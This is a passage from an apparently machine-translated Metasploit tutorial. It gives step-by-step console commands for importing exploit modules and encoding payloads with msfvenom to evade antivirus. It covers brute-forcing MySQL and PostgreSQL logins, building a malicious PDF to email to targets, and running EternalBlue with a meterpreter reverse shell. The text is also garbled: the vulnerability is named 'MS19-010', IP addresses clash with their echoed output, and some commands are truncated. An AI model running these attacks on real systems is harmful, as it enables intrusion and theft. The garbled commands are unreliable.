    execution command is as follows: ￼msf5> workspace -v￼From the output information,
    we can see that there are 3 hosts and 8 services in the default workspace. It
    can be explained that the information of 3 hosts has been imported. ￼Chapter 28Query
    Penetration test module![](Image00006.jpg)Query penetration test moduleVulnerability
    is mainly realized through the penetration testing module of Metasploit. Therefore,
    users need to find the corresponding penetration test module based on the vulnerability.
    In Metasploit, you can use the search command to quickly find penetration testing
    modules. Users can also go to some third-party websites to find penetration testing
    modules and import them into Metasploit to implement vulnerability exploitation.
    This section will introduce how to query the penetration test module.Pre-analysis
    scan reportThe user has successfully imported the scan report in the previous
    section. At this point, the user can analyze the scan report to find out the vulnerabilities
    in the target system. Then, according to the vulnerability, find the penetration
    test module that can exploit the vulnerability and implement the attack. The following
    will introduce the method of pre-analyzing the scan report.The specific steps
    are as follows:1) Use the hosts command to view the reported host information.The
    execution command is as follows: ￼msf5> hosts￼From the output information, we
    can see that there are 3 hosts in the scan report. Among them, the addresses are
    192.168.29.223, 192.168.29.225 and 192.168.29.127 respectively.2) Use the vulns
    command to view vulnerability information.The execution command is as follows:
    ￼msf5> vulns￼Next, users canName (Name) or reference information (References)
    search for the attack payload that can be used.Manually find the attack payloadAfter
    users determine the vulnerabilities in the target system, they can search for
    penetration testing modules in Metasploit to select the penetration testing modules
    that can exploit their vulnerabilities, and then implement penetration testing.
    The following will introduce the method of manually searching the penetration
    test module using the search command.The syntax format for finding the penetration
    test module is as follows: ￼search [options]In the above statement, options means
    supported options; keywords means available keywords.Next, we will manually find
    the CVE vulnerability as the penetration test module in 2020.The execution command
    is as follows: ￼msf5> search cve:2020From the output information, we can see that
    all penetration test modules with a release date of 2020 have been searched. The
    output information includes 5 columns of information, which respectively represent
    Name (the name of the attack payload), Disclosure Date (release date), Rank (level),
    Check (whether vulnerability detection is supported), and Description (description
    information).In the pre-analysis scan report of the above, look for the penetration
    test module with the vulnerability name MS17-010 SMB RCE Detection.The execution
    command is as follows: ￼msf5> search name:MS19-010 SMB RCE Detection￼From the
    output information, we can see that all penetration test modules that can exploit
    MS19-010 vulnerabilities have been found. At this point, the user can select a
    penetration testing module to implement penetration testing.For example, select
    the penetration testing module named exploit/windows/smb/ms19_010_eternalblue.The
    execution command is as follows:msf5> exploit/windows/smb/ms19_010_eternalblue￼msf5
    exploit(windows/smb/ms19_010_eternalblue)Third-party searchIf users cannot find
    a valid penetration test module in Metasploit, they can also find it from third-party
    websites, such as CVE vulnerability sites and exploitDB. In addition, Metasploit
    also supports importing third-party modules and implementing penetration testing.
    The following describes how to find penetration testing modules from these third-party
    websites.1) Find through the CVE vulnerability websiteThe address of the CVE vulnerability
    website is https://www.cvedetails.com/. After successfully accessing the website
    in the browser, the interface shown will be displayed. ￼ At this point, users
    can search for penetration test modules by CVE ID, product name, manufacturer,
    or vulnerability type on the site page.For example, query Microsoft related vulnerabilities.
    Enter Microsoft in the search box, and then click the Search button to display
    the search results. ￼ From this interface, you can see the searched Microsoft
    related statistics. It can be seen from the statistical results that a total of
    6328 vulnerabilities have been found.At this point, select the Vulnerabilities
    (6328) option to display the detailed information of the vulnerability. ￼ From
    this interface, you can see all the vulnerability information, including CVE ID,
    vulnerability type, release date, update date, and score. For example, CVE IE
    is CVE-2020-0879, the vulnerability type is Exec Code Overflow, the release date
    is 2020-04-09, and the update date is 2020-04-11.2) Find through exploitDB vulnerability
    websiteThe address of exploitDB vulnerability website is https://www.exploit-db.com/.
    After successfully accessing the website in the browser, the interface shown will
    be displayed. ￼ Enter some keywords of the attack payload on this interface to
    search for the corresponding penetration test module. When searching, users can
    also select the Verified and Has App checkboxes to filter the verified and vulnerable
    application penetration test modules. For example, search for the penetration
    test module of the Windows system. After the search is successful, the boundary
    shown will be displayed.From this interface, you can see all the searched results.
    The output information includes 8 columns, indicating Date (release date), D (download
    penetration attack payload), A (available application), V (verified), Title (vulnerability
    title), Type (type) ), Platform (platform) and Author (author). Here, users can
    choose to download and view detailed information about the vulnerability. If you
    want to download the penetration test module, click the download button in column
    D ￼. If you want to view the detailed information of the vulnerability, just click
    the title of the vulnerability.From the description of the interface, you can
    see the details of the vulnerability. In addition, users can download some penetration
    testing modules from this website and manually import them into Metasploit.3)
    Manually import third-party modulesMetasploit''s own modules are already very
    rich, but sometimes they cannot fully meet the needs of users. For some relatively
    new vulnerabilities or vulnerabilities without official module support, users
    can only manually write or import third-party modules. For general users, it is
    more convenient to use by directly importing third-party modules, and it is not
    easy to make mistakes. Therefore, the method of manually importing third-party
    modules will be introduced below.Import the third-party module downloaded from
    the exploitDB website, and use the module to perform penetration testing.Here
    will take the exiftran command injection module as an example, and set the file
    name to webtest.rb.The specific steps are as follows:1) Copy the module file webtest.rb
    to the module location corresponding to Metasploit. Among them, the default location
    of the Metasploit module is /root/.msf4/modules. In order to distinguish the modules
    conveniently, users can create corresponding folders according to the classification
    of the modules to store different types of modules.In this example, a penetration
    attack module will be imported, so a folder named exploits will be created here.
    as follows: ￼root@exampleserver:～# mkdir /root/.msf4/modules/exploitsAfter executing
    the above command, there will be no information output.Here, for the convenience
    of remembering or finding the location of the module, create a test directory,
    and then copy the attack payload file into it. as follows: ￼root@exampleserver:～#
    cd /root/.msf4/modules/exploits/￼From the output information, we can see that
    the penetration attack module file webtest.rb has been successfully copied to
    the newly created location.2) Restart the Metasploit tool to see the loaded penetration
    test attack module.The execution command is as follows: ￼root@exampleserver:～#
    msfconsole￼ ￼ msf5>From the information displayed above, we can see that the exploit
    class module has changed from 1873 to 1874\. This shows that the module has been
    successfully imported.(3) Select the webtest module and view the options of the
    module.The execution command is as follows: ￼msf5> use exploit/test/webtest#Select
    the module to use ￼ 0 AutoAs you can see from the output information, all options
    of the webtest module are displayed. The above information includes 4 columns,
    which respectively represent Name (option name), Current Setting (current setting),
    Required (whether it is necessary to set) and Description (description). From
    the output information, you can see that RHOSTS must configure options, but they
    have not been set yet.4) Set the RHOSTS option.The execution command is as follows:
    ￼msf5 exploit(test/webtest)> set RHOSTS 192.168.29.223 RHOSTS => 192.168.29.225From
    the output information, we can see that the target host address has been set to
    192.168.29.227\. ￼Chapter 29Performing an Attack using Metasploit![](Image00006.jpg)Perform
    an attackAfter the user finds a penetration test module that can exploit the vulnerability,
    the attack can be carried out. To perform further attacks, users can also load
    the attack payload (Payload). Then, configure the attack payload and implement
    the attack. This section will introduce the method of implementing the attack.Loading
    the attack payloadThe attack payload is the aforementioned Payload module. By
    loading attack payloads, further attacks can be achieved, such as obtaining Shell
    and remotely executing commands. The method of loading the attack payload will
    be introduced below.The syntax format for loading the attack payload is as follows:
    ￼set payloadIn the above syntax, the parameter payload name represents the name
    of the attack payload.Load the attack payload for the webtestpenetration test
    module imported in above is shownThe specific steps are as follows:1) Start and
    select the webtest penetration test module. as follows: ￼root@exampleserver:～#
    msfconsole￼ msf5> use exploit/test/webtest￼ msf5 exploit(test/webtest)>2) View
    the payload that can be loaded.The execution command is as follows: ￼msf5 exploit(test/webtest)>
    show payloads￼ As can be seen from the output information, all available payloads
    of the current penetration test module are displayed. The output information shows
    a total of 6 columns of information, which respectively indicate # (Payload number),
    Name (name), Disclosure Date (release date), Rank (level), Check (support detection)
    and Description (description information). For example, load a PHP execution command
    payload, namely php/exec.3) Load the attack payload.The execution command is as
    follows: ￼msf5 exploit(test/webtest)> set payload php/exec￼ payload => php/execFrom
    the output information, we can see that an attack payload named php/exec is loaded.Configure
    attack payloadAfter the user loads the attack payload, it also needs to be configured
    and set the parameter options that need to be configured.The following describes
    how to configure the attack payload.The following will take php/exec as an example
    to introduce the method of configuring the attack payload.1) Use the show options
    command to view the configurable options.The execution command is as follows:
    ￼msf5 exploit(test/webtest)> show options￼From the output information, you can
    see that it includes module options, attack load options, and available target
    options. At this point, the user can set these options.2) Set the option CMD of
    the attack payload. as follows: ￼msf5 exploit(test/webtest)> set CMD dir￼ CMD
    => dirIt can be seen from the output information that the CMD value of the Payload
    option has been set to dir. Next, you can attack the target.3) Implement an attack.The
    execution command is as follows: ￼msf5 exploit(test/webtest)> exploitSetting up
    the architectureSome penetration testing modules may support multiple system architectures.
    Under normal circumstances, penetration testing modules that support multiple
    system architectures are automatically automatic by default. When the user initiates
    an attack, the penetration test module will automatically select the target based
    on the detected target information.If the user obtains the architecture of the
    target host through other means, he can also manually set the architecture to
    improve the efficiency of penetration testing. The following will introduce the
    method of setting up the architecture.The following will take the MS08_067 vulnerability
    module as an example to introduce the method of setting the architecture.The specific
    steps are as follows:1) Select the MS08_067 vulnerability module and view the
    module configuration options.The execution command is as follows: ￼msf5> use exploit/windows/smb/ms08_067_netapi￼
    msf5 exploit(windows/smb/ms08_067_netapi)> show options￼From the output information,
    you can see all the configuration options of the MS08_067 vulnerability module.
    As you can see from the displayed results, the available target is Automatic Targeting.
    At this point, the user can use the show targets command to view the target architectures
    supported by the vulnerable module.2) Check the available target architecture.The
    execution command is as follows: ￼msf5 exploit(windows/smb/ms08_067_netapi)> show
    targets￼From the output information, you can see all the target architectures
    supported by the module. There are two columns in the output information, representing
    Id (number) and Name (target name). By analyzing the output results, it can be
    known that the architecture supported by the vulnerable module includes Windows
    2000 Universal, Windows XP SP0/SP1 Universal, and Windows 2003 SP0 Universal.
    Next, users can set according to their target system architecture.Among them,
    the syntax format of setting the architecture is as follows: ￼set target [id]In
    the above syntax, the parameter id refers to the supported architecture number.3)
    Set the target architecture to Windows XP SP0/SP1 Universal.The execution command
    is as follows: ￼msf5 exploit(windows/smb/ms08_067_netapi)> set target 2￼ target
    => 2From the output information, we can see that the target architecture number
    has been successfully set to 2\. At this point, the user can view the options
    of the module again, and it is determined that the target architecture is set
    successfully. as follows: ￼msf5 exploit(windows/smb/ms08_067_netapi)> show options￼From
    the output information, we can see that the target system architecture is successfully
    set to Windows XP SP0/SP1 Universal.Set encodingIn order to avoid the appearance
    of bad characters, or to avoid the interception of the firewall or anti-virus
    software in the target host, you can set the code for the attack load to generate
    a new attack load. Among them, the encoding module is mainly used by the msfvenom
    tool. msfvenom is an attack load generator supporting the MSF framework.Among
    them, the syntax format used to generate the attack payload is as follows: ￼msfvenom
    [options]<var=val>Use the x86/shikata_ga_nai encoding format to generate a new
    attack payload and save it to msf.exe.Methods as below:1) View all supported codes.The
    execution command is as follows: ￼root@exampleserver:～# msfvenom -l encoders￼2)
    Create attack payload.The execution command is as follows: ￼root@examplserver:～#
    ./msfvenom-p windows/meterpreter/bind_tcp RHOST=192.168.￼From the information
    output above, we can see that an attack payload was successfully created using
    x86/shikata_ga_nai encoding. Among them, the attack payload file is msf.exe. ￼Chapter
    30A Real Life Attack Scenario![](Image00006.jpg)Attack exampleThrough the previous
    introduction to the Metasploit framework, readers should understand the basic
    attack steps. Different attack modules use different steps and require users to
    use them flexibly. However, the basic idea is the same. Users first search for
    penetration testing modules that can exploit their vulnerabilities, then load
    the attack payload, and then perform penetration testing. In order to make users
    more proficient in the entire penetration testing process, this section will introduce
    several attack examples.Penetration attack on MySQL database serviceMySQL is a
    relational database management system. In terms of web server applications, MySQL
    database is usually the best choice for users. If the administrator configures
    improperly, there may be vulnerabilities, such as weak passwords, incorrect user
    rights configuration, etc. At this point, the penetration tester can try to perform
    penetration testing on it. In the MSF control terminal, an auxiliary module mysql_login
    is provided, which can be used to crack weak passwords. The following will introduce
    the use of this module to implement penetration testing on MySQL database services.Use
    the mysql_login module to penetrate the MySQL database service.The specific steps
    are as follows:1) Use the mysql_login module.The execution command is as follows:
    ￼msf5> use auxiliary/scanner/mysql/mysql_login￼ msf5 auxiliary(scanner/mysql/mysql_login)>2)
    View module configuration options.The execution command is as follows: ￼msf5 auxiliary(scanner/mysql/mysql_login)>
    show options￼ Module options (auxiliary/scanner/mysql/mysql_login):￼From the output
    information, you can see all the configuration options parameters. Among them,
    there are several options that must be configured. Next, it will be configured.3)
    Configure module option parameters.The execution command is as follows: ￼msf5
    auxiliary(scanner/mysql/mysql_login)> set RHOSTS 192.168.29.215 USERPASS_FILE
    => /root/passwords.txtIt can be seen from the output information that the module
    option parameters have been successfully set.4) Implement penetration testing.The
    execution command is as follows: ￼msf5 auxiliary(scanner/mysql/mysql_login)exploit￼
    [＊ ] Auxiliary module execution completedIt can be seen from the output information
    that successive attempts to connect to the MySQL server using the username and
    password in the specified username/password file. After trying all the user names
    and passwords, I found a valid MySQL database user and password. The user name
    is root and the password is 123456.Chapter 31Advanced Attacking using Metasploit![](Image00006.jpg)Penetration
    attacks on PostgreSQL database servicesPostgerSQL is a free object-relational
    database service (database management system). In some cases, users can also use
    the database service to store data, such as Metasploit. The following will introduce
    the use of postgrs_login module to implement penetration testing on PostgreSQL
    database services.Use the postgres_login module to implement penetration attacks
    on PostgreSQL database services.The specific steps are as follows:1) Select the
    postgres_login module.The execution command is as follows: ￼msf5> use auxiliary/scanner/postgres/postgres_login￼
    msf5 auxiliary(scanner/postgres/postgres_login)>2) View the configurable option
    parameters.The execution command is as follows: ￼msf5 auxiliary(scanner/postgres/postgres_login)>
    show options￼From the output information, you can see all the configuration options
    parameters. Next, all option parameters will be configured.3) Configure RHOSTS
    option parameters.The execution command is as follows: ￼msf5 auxiliary(scanner/postgres/postgres_login)>
    set RHOSTS 192.168.29.223 RHOSTS => 192.168.29.2254) Implement penetration testing.The
    execution command is as follows: ￼msf5 auxiliary(scanner/postgres/postgres_login)>
    exploit￼ msf5 auxiliary (scanner/postgres/postgres_login)>As you can see from
    the output information, a valid username and password were found, both of which
    are postgres.Pdf Attacks using MetasploitPDF is a file format. This type of file
    is widely used and easy to transfer. The penetration testing methods introduced
    earlier are all active implementations of penetration testing. If the target host
    does not monitor the server port, you need to use passive penetration testing.
    At this point, you can try to send a virus-containing PDF file to the client to
    perform passive attacks. The following will introduce the creation of PDF files
    with viruses to achieve passive penetration testing attacks.Use Adobe PDF Embedded
    EXE module to create PDF virus files. The specific steps are as follows:1) Use
    adobe_pdf_embedded_exe module.The execution command is as follows: ￼msf> use exploit/windows/fileformat/adobe_pdf_embedded_exe￼
    msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe)>2) View the available
    options of adobe_pdf_embedded_exe module.The execution command is as follows:
    ￼msf exploit(adobe_pdf_embedded_exe)> show options￼The above information shows
    all the options available for the adobe_pdf_embedded_exe module. From the information
    output above, you can see that the default PDF virus file used is template.pdf,
    and the output file name is evil.pdf. If users do not want to use the default
    PDF file, they can specify their own virus file and output file name.3) Set the
    name of the PDF file that the user wants to generate.The execution command is
    as follows: ￼msf exploit(adobe_pdf_embedded_exe)> set FILENAME test.pdf￼ FILENAME
    => test.pdf4) Set the INFILENAME option. In order to use the PDF file, use this
    option to specify the location of the PDF file accessed by the user. If the user
    does not have a suitable PDF attack file, the default template file template.pdf
    can also be used, and there is no need to configure this option.The execution
    command is as follows: ￼msf exploit(adobe_pdf_embedded_exe)> set INFILENAME /root/evil.pdf￼
    INFILENAME => /root/evil.pdf￼Note: The keyword Root cannot be included in the
    PDF file specified here. Otherwise, the corresponding PDF file with virus cannot
    be generated.5) Generate PDF virus files.The execution command is as follows:
    ￼msf exploit(adobe_pdf_embedded_exe)> exploit￼The output information shows that
    the test.pdf file has been generated and saved in the /root/.msf4/local directory.
    Next, the user can send the created PDF file to the target host by email or other
    means, and then establish a monitoring locally. When the target host user opens
    the PDF file, he may be attacked.Use MS17_010 vulnerability to carry out attacksMS17_010
    is a Microsoft Windows vulnerability exploited by "Eternal Blue" (ransomware).
    Penetration testers may allow remote code execution by using this vulnerability
    to send specially designed messages to the Microsoft Server Message Block 1.0
    (SMBv1) server. The following will introduce the use of MS17_010 vulnerability
    to target WindowsServer 2008 R2 (x64) implemented penetration testing.Use MS17_010
    vulnerability to implement penetration testing.The specific steps are as follows:1)
    Query the penetration test module that can exploit the MS17_010 vulnerability.The
    execution command is as follows: ￼msf5> search ms17-010￼From the output information,
    you can see that 5 available penetration test modules have been found. By analyzing
    the description information, we can see that the second is the scanning module;
    the third is the vulnerability exploitation module. At this point, before implementing
    the penetration test, use the scanning module to detect whether the target has
    the vulnerability.2) Select the smb_ms17_010 module and view its configuration
    options.The execution command is as follows: ￼msf5> use auxiliary/scanner/smb/smb_ms17_010￼
    msf5 auxiliary(scanner/smb/smb_ms17_010)> show options￼The above output information
    shows all the configuration options of the current module. At this time, the module
    can be run by only setting a target address to detect whether the target has MS17_010
    vulnerability.3) Configure the RHOSTS option.The execution command is as follows:
    ￼msf5 auxiliary(scanner/smb/smb_ms17_010)> set RHOSTS 192.168.29.215 RHOSTS =>
    192.168.29.215From the output information, you can see that the target host address
    for the scan is 192.168.29.215.4) Implement vulnerability scanning test.The execution
    command is as follows: ￼msf5 auxiliary(scanner/smb/smb_ms17_010)> exploit￼It can
    be seen from the output information that the MS17_010 vulnerability exists in
    the target host. Next, the vulnerability will be used to perform penetration testing
    on the target host.5) Select ms17_010_eternalblue module.The execution command
    is as follows: ￼msf5 auxiliary(scanner/smb/smb_ms17_010)> use exploit/windows/smb/ms17_￼6)
    Load the attack payload.The execution command is as follows: ￼msf5 exploit(windows/smb/ms17_010_eternalblue)>
    set payload windows/x64/￼ meterpreter/reverse_tcp￼ payload => windows/x64/meterpreter/reverse_tcp7)
    View all configuration options parameters.The execution command is as follows:
    ￼msf5 exploit(windows/smb/ms17_010_eternalblue)> show options￼ Module options
    (exploit/windows/smb/ms17_010_eternalblue):￼From the output information, you can
    see all the configuration options parameters. Next, configure the options that
    must be configured: RHOSTS and LHOST.8) Configure option parameters.The execution
    command is as follows: ￼msf5 exploit(windows/smb/ms17_010_eternalblue)> set RHOSTS
    192.168.29.215 RHOSTS => 192.168.29.215￼ msf5 exploit(windows/smb/ms17_010_eternalblue)>
    set LHOST 192.168.29.2239) Implement penetration testing.The execution command
    is as follows: ￼msf5 exploit(windows/smb/ms17_010_eternalblue)> exploit￼ meterpreter>As
    can be seen from the output information, a Meterperter session was successfully
    obtained. Also, the command line prompt is displayed as meterpreter >.At this
